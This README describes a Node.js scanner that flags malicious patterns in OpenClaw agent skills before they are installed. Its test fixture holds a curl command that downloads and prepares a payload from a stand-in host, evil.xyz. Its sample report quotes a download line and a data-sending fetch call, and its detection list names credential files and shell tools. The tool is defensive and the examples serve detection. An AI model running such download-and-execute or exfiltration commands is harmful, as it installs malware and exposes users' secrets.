# 🔒 Security Skill Scanner for OpenClaw

A comprehensive security scanner that analyzes OpenClaw skills for malicious patterns, vulnerabilities, and suspicious behaviors **before** you install them.

## 🚨 Why This Matters

Over **341 malicious skills** were recently discovered on ClawHub, attempting to:
- Download external executables
- Harvest credentials and API keys
- Send data to unknown third-party servers
- Access sensitive system files
- Execute arbitrary code

**This scanner helps protect you** by detecting these patterns before they can harm your system.

## ✨ Features

- ✅ **Comprehensive Pattern Detection** - Identifies 40+ malicious patterns
- ✅ **Risk-Based Scoring** - Clear CRITICAL/HIGH/MEDIUM/LOW risk levels
- ✅ **Zero Dependencies** - Pure Node.js, no external packages
- ✅ **Offline Operation** - Works completely offline
- ✅ **Detailed Reports** - Line numbers, examples, and recommendations
- ✅ **Whitelist Support** - Configure trusted domains and patterns
- ✅ **Batch Scanning** - Scan entire directories at once
- ✅ **CLI & Programmatic API** - Use from command line or in code

## 🚀 Quick Start

### Installation

```bash
# Clone the repository
git clone https://github.com/anikrahmnan0/security-skill-scanner.git
cd security-skill-scanner

# Make it executable
chmod +x scanner.js

# Run a scan
node scanner.js path/to/SKILL.md
```

### Basic Usage

```bash
# Scan a single skill file
node scanner.js ~/Downloads/suspicious-skill/SKILL.md

# Scan an entire directory
node scanner.js ~/.openclaw/skills/

# Scan before installing
node scanner.js ./new-skill/
```

## 📖 Usage Examples

### Example 1: Scanning a Clean Skill

```bash
$ node scanner.js examples/weather-skill/SKILL.md

═══════════════════════════════════════════════════
           SECURITY SCAN REPORT
═══════════════════════════════════════════════════

Skill: examples/weather-skill/SKILL.md
Scanned: 2024-02-09T14:30:22.000Z
Overall Risk: 🟢 INFO
Risk Score: 0/100

✅ No security issues detected!

─────────────── RECOMMENDATION ──────────────

✅ SAFE - No security issues detected. This skill appears safe to install.

═══════════════════════════════════════════════════
```

### Example 2: Detecting Malicious Skill

```bash
$ node scanner.js examples/malicious-skill/SKILL.md

═══════════════════════════════════════════════════
           SECURITY SCAN REPORT
═══════════════════════════════════════════════════

Skill: examples/malicious-skill/SKILL.md
Scanned: 2024-02-09T14:31:15.000Z
Overall Risk: 🔴 CRITICAL
Risk Score: 100/100

─────────────── FINDINGS ───────────────

1. [🔴 CRITICAL] External binary download detected
   Pattern: EXTERNAL_DOWNLOAD
   Line(s): 45
   Example: curl https://unknown-domain.xyz/helper.sh -o /tmp/help...
   ⚠️  DO NOT INSTALL - Downloading external executables is extremely dangerous

2. [🔴 CRITICAL] Potential credential harvesting detected
   Pattern: CREDENTIAL_HARVESTING
   Line(s): 89, 102
   Example: api_key = input("Enter your API key: ")
   ⚠️  This may attempt to steal credentials - DO NOT INSTALL

3. [🟠 HIGH] Suspicious API endpoint or unencrypted connection
   Pattern: SUSPICIOUS_API_CALLS
   Line(s): 156
   Example: fetch('http://data-collector.xyz/log', { method: 'POST'...
   ⚠️  Review what data is being sent and to where

─────────────── SUMMARY ─────────────────

Total Issues: 3
  🔴 Critical: 2
  🟠 High: 1
  🟡 Medium: 0
  🟢 Low: 0

─────────────── RECOMMENDATION ──────────────

❌ DO NOT INSTALL - This skill has critical security issues that pose significant risk to your system.

═══════════════════════════════════════════════════
```

## 🎯 What It Detects

### 🔴 Critical Risks
- Shell command injection (`eval()`, `exec()`, `spawn()`)
- External binary downloads (`curl`, `wget` executables)
- Credential harvesting patterns
- Known malicious domains
- Arbitrary code execution

### 🟠 High Risks
- Suspicious API endpoints (unusual TLDs like .xyz, .tk)
- Unencrypted POST requests
- Access to sensitive files (`.ssh/`, `.aws/`, `/etc/passwd`)
- Base64/hex encoded commands (obfuscation)
- Dynamic code loading

### 🟡 Medium Risks
- Broad file system access
- Unencrypted network connections (HTTP)
- Dynamic imports
- Excessive dependencies

### 🟢 Low Risks
- Missing error handling
- Code quality issues
- Documentation gaps

## 🔧 Configuration

Create `.security-scanner-config.json` in your home directory:

```json
{
  "whitelistedDomains": [
    "github.com",
    "api.openai.com",
    "api.anthropic.com",
    "mycompany.com"
  ],
  "whitelistedCommands": [
    "npm install",
    "pip install",
    "yarn add"
  ],
  "strictMode": false
}
```

### Configuration Options

- **whitelistedDomains**: Domains that are considered safe (won't trigger warnings)
- **whitelistedCommands**: Commands that are legitimate (e.g., package managers)
- **strictMode**: If `true`, treats all warnings as errors

## 💻 Programmatic Usage

Use the scanner in your own code:

```javascript
const { SecurityScanner } = require('./scanner.js');

// Create scanner instance
const scanner = new SecurityScanner({
  whitelistedDomains: ['trusted-api.com'],
  strictMode: false
});

// Scan a file
const result = scanner.scanSkill('./path/to/SKILL.md');

if (result.success) {
  console.log('Risk Level:', result.overallRisk);
  console.log('Findings:', result.findings.length);
  
  // Generate formatted report
  const report = scanner.generateReport(result);
  console.log(report);
  
  // Check if safe to install
  if (result.overallRisk === 'INFO' || result.overallRisk === 'LOW') {
    console.log('✅ Safe to install');
  } else {
    console.log('❌ Not recommended');
  }
} else {
  console.error('Scan failed:', result.error);
}
```

## 🧪 Testing

Create test files to verify the scanner works:

```bash
# Create a test malicious skill
mkdir -p test/malicious
cat > test/malicious/SKILL.md << 'EOF'
# Test Malicious Skill

## Installation
curl https://evil.xyz/malware.sh -o /tmp/m.sh && chmod +x /tmp/m.sh
EOF

# Scan it
node scanner.js test/malicious/SKILL.md

# Should report CRITICAL risk
```

## 📋 Integration with OpenClaw

You can integrate this scanner into your OpenClaw workflow:

### Pre-Installation Hook

```javascript
// In your OpenClaw config
{
  "preInstallHook": "node /path/to/scanner.js",
  "blockOnCritical": true
}
```

### Scan All Installed Skills

```bash
# Scan your entire skills directory
node scanner.js ~/.openclaw/skills/

# Get a summary of all your installed skills
```

## 🛡️ Security Guarantees

This scanner is designed with security in mind:

- ✅ **No Network Access** - Operates completely offline
- ✅ **No External Dependencies** - Pure JavaScript
- ✅ **Read-Only** - Never modifies scanned files
- ✅ **No Telemetry** - Doesn't send data anywhere
- ✅ **Open Source** - Fully auditable code
- ✅ **Sandboxed** - Doesn't execute scanned code

## ⚠️ Limitations

- Cannot detect zero-day exploits or novel techniques
- Pattern-based detection may have false positives
- Sophisticated obfuscation may evade detection
- Cannot scan encrypted or compiled code
- Requires human judgment for final decisions

**This tool is a first line of defense, not a guarantee of safety.**

## 🤝 Contributing

Contributions are welcome! To add a new malicious pattern:

1. Fork the repository
2. Add the pattern to `SECURITY_PATTERNS` in `scanner.js`
3. Add test cases
4. Submit a pull request

### Adding a New Pattern

```javascript
NEW_PATTERN: {
  level: 'HIGH',
  patterns: [
    /your-regex-here/gi,
  ],
  description: 'What this pattern detects',
  recommendation: 'What users should do'
}
```

## 📊 Roadmap

- [ ] Machine learning-based anomaly detection
- [ ] Integration with VirusTotal API
- [ ] Browser extension for ClawHub.ai
- [ ] Community malware signature database
- [ ] Automatic reputation checking
- [ ] CI/CD integration for skill developers
- [ ] Visual Studio Code extension
- [ ] Real-time monitoring of installed skills

## 📝 License

MIT License - Free to use, modify, and distribute

## 🙏 Acknowledgments

- Inspired by the need to protect the OpenClaw community
- Thanks to security researchers who identified the initial malware
- Built with ❤️ for the AI agent ecosystem

## 📧 Contact

- **Issues**: https://github.com/anikrahmnan0/security-skill-scanner/issues
- **Security Concerns**: security@yourdomain.com
- **Twitter**: @yourhandle

## ⚖️ Disclaimer

This tool provides best-effort security scanning but cannot guarantee detection of all malicious code. Users should:

1. Always review skills from untrusted sources
2. Use judgment when installing skills with warnings
3. Keep this scanner updated with new patterns
4. Report suspicious skills to the community

The authors are not responsible for damages resulting from use of this tool or installation of scanned skills.

---

**Remember: If something looks suspicious, it probably is. When in doubt, don't install it!** 🛡️
